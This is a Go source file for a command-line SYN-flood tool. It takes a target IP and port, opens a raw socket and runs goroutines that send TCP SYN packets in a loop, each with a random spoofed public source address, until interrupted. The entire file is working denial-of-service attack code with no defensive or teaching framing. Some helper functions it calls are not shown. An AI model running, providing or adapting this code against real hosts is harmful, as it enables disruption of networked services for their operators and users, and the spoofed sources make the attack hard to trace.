package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"sync"
	"syscall"
)

func main() {

	host := flag.String("host", "", "destination ip")
	port := flag.Int("port", 0, "destination port")
	flag.Parse()

	if *host == "" || *port == 0 {
		flag.Usage()
		os.Exit(1)
	}

	dstIp := net.ParseIP(*host)
	if dstIp == nil {
		log.Fatalf("invalid host: %s", *host)
	}
	dstPort := uint16(*port)
	log.Printf("starting syn-flood against %s:%d", dstIp, dstPort)

	rawSocket, err := NewRawSocket(dstIp)
	if err != nil {
		log.Fatalf("new raw socket: %v", err)
	}
	defer rawSocket.Close()

	wg := &sync.WaitGroup{}
	ctx, cancelFunc := context.WithCancel(context.Background())
	for i := range 2 {
		wg.Add(1)
		go Run(wg, ctx, rawSocket, dstIp, dstPort)
		log.Printf("started go routine %d", i)
	}
	log.Println("press ^C to stop")

	termChan := make(chan os.Signal, 1)
	signal.Notify(termChan, syscall.SIGINT, syscall.SIGTERM)
	<-termChan
	log.Println("received term signal")
	cancelFunc()
	wg.Wait()
	log.Println("done")
}

func Run(wg *sync.WaitGroup, ctx context.Context, rawSocket RawSocket, dstIp net.IP, dstPort uint16) {

	packet := make([]byte, IPV4HeaderLen+TCPSYNHeaderLen)
	for {
		select {
		case <-ctx.Done():
			log.Println("canceling")
			wg.Done()
			return
		default:
			if err := SendSYN(rawSocket, packet, dstIp, dstPort); err != nil {
				log.Printf("send SYN: %v", err)
			}
		}
	}
}

func SendSYN(rawSocket RawSocket, packet []byte, dstIp net.IP, dstPort uint16) error {

	srcIp := GetRandPublicIP()

	if err := WriteTCPSYNHeader(packet[IPV4HeaderLen:], srcIp, dstIp, dstPort); err != nil {
		return fmt.Errorf("write TCP header: %w", err)
	}
	WriteIPV4Header(packet, srcIp, dstIp, len(packet))

	if err := rawSocket.Send(packet); err != nil {
		return fmt.Errorf("send data to: %w", err)
	}
	return nil
}
